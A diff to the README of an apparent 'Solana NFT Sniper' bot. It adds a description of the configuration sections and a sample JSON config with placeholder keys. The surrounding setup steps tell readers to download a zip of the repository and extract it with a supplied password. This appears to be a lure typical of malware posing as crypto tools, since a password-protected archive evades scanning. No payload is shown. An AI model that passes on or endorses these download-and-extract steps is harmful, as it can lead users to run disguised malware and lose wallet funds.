@@ -34,8 +34,33 @@ Solana NFT Sniper, distinguished by its CLI-free program interface, introduces a
 - [Clone](https://github.com/medlaare/solana-nft-sniper/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
 - Extract archive with password `GgX2qVdUt`
 - `Customize the bot's configuration` to match your sniping strategy and preferences.
-- 
+-  `tensorApi` section includes information needed for Tensor Marketplace integration, such as the API base URL and an API key.
+- `snipingAlgorithm` section contains parameters for the smart sniping algorithm, including precision thresholds, bidding strategy, and discount thresholds.
+- `userInterface` section includes settings for the program interface, such as enabling visual indicators and logs history.
+- `security` section includes security-related settings, like two-factor authentication and encryption key.
 - Run the bot
+
+```json
+{
+  "tensorApi": {
+    "baseUrl": "https://tensor-marketplace-api.com",
+    "apiKey": "your-api-key-here"
+  },
+  "snipingAlgorithm": {
+    "precisionThreshold": 0.95,
+    "bidStrategy": "automated",
+    "discountThresholds": [3, 10, 20]
+  },
+  "userInterface": {
+    "visualIndicators": true,
+    "logsHistory": true
+  },
+  "security": {
+    "twoFactorAuthentication": true,
+    "encryptionKey": "your-encryption-key"
+  }
+}
+```
 ## Contribution
 
 Contributions from the community are highly encouraged. Whether you're a seasoned developer or a Solana NFT enthusiast, feel free to contribute by submitting bug reports, feature requests, or even pull requests to enhance the bot's capabilities.
